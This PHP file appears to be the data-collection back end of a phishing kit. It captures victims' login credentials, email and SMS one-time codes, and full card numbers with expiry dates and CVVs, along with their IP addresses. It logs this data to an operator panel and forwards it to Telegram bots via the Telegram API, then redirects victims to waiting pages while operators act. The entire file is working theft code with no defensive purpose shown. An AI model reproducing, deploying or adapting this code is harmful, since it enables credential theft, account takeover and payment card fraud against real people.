<?php
require "../main.php";

$bot = $a_bot;
$ids = explode(",",str_replace(" ","",$a_ids));


$panel = str_replace('web/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."panel/view.php?vip=$ip");

$ip = $_SERVER['REMOTE_ADDR'];

function post($data){
	if(empty(trim($data))){
		return "NO_DATA";
	}else{
		return htmlspecialchars($_POST[$data]);
	}
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}


if(isset($_POST['user'])){
	
	$login = post("user");
	$pass = post("pass");

	$telegram_content = urlencode("
	TF LOGIN / $ip
	+ ID : $login
	+ DATE : $pass
	---------------------------------------
+ PANEL : $panel
	");
	
	//save data in panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ LOGIN [ $login | $pass ] ";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	

		//SENDING INFO TO TELEGRAM BOT...
		foreach($ids as $id){
			$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
			sendBot($url);
		}
		 header("location: wait.php?p=LOGIN");
 
}
	

 


if(isset($_POST['email_code'])){
	
	$sms = post("email_code");
	
	$telegram_content = urlencode("
	TF EMAIL CODE / $ip
	+ SMS : $sms
	---------------------------------------
	+ PANEL : $panel
	");
	
	//save data to panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ SMS [ $sms]";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	
	//SENDING INFO TO TELEGRAM BOT...
	foreach($ids as $id){
	$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
	sendBot($url);
	}
	header("location: wait.php?p=EMAIL");
	}
	




if(isset($_POST['sms'])){
	
$sms = post("sms");

$telegram_content = urlencode("
TF SMS / $ip
+ SMS : $sms
---------------------------------------
+ PANEL : $panel
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ SMS [ $sms]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
header("location: wait.php?p=SMS");
}



if(isset($_POST['cc'])){
	
	$cardnumber = post('cc');
	$exp = post("exp");
	$cvv = post("cvv");

$telegram_content = urlencode("
TF CC / $ip
+ Cardnumber : $cardnumber 
+ ExpDate : $exp 
+ CVV : $cvv
---------------------------------------
+ PANEL : $panel
");

//save data
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ CARD [ $cardnumber | $exp | $cvv ]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
header("location: wait.php?p=CARD");

}




 

?>